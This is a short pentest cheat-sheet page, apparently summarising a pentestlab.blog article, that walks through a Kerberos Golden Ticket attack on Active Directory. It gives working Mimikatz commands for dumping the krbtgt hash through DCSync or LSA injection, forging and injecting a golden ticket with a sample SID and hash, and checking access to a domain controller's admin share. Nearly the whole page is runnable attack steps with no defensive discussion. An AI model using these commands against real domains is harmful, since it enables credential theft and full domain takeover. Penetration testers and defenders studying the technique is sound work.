`Golden/Silver Ticket Attacks <https://pentestlab.blog/2018/04/09/golden-ticket/>`_
****************************************************************************************

Discovery of Golden Ticket Prerequisites
#############################################

Find user SID with the following:

.. code-block:: console

   whoami /user

The DCSync is a mimikatz feature which will try to impersonate a domain controller and request account password information from the targeted domain controller. This technique is less noisy as it doesn’t require direct access to the domain controller or retrieving the NTDS.DIT file over the network.

.. code-block:: console

        lsadump::dcsync /user:krbtgt

Alternatively Mimikatz can retrieve the hash of the krbtgt account from the Local Security Authority (LSA) by executing Mimikatz on the domain controller.

.. code-block:: console

        privilege::debug
        lsadump::lsa /inject /name:krbtgt

Mimikatz
#########

A forged Golden ticket can be created with Mimikatz by using the obtained information.

.. code-block:: console

   kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt

The **kerberos::list** command will retrieve all the available Kerberos tickets and the **kerberos::tgt** will list the ticket that has been submitted for the current user session.

.. code-block:: console

        kerberos::list
        kerberos::tgt

Since the ticket was generated with NTLM hash of the krbtgt account Kerberos will trust the ticket by default and therefore any user valid or invalid regardless of their privileges have unrestricted network access including access to the domain controller. This can be confirmed by listing the admin share on the domain controller.

.. code-block:: console

   dir \\WIN-PTELU2U07KG\C$


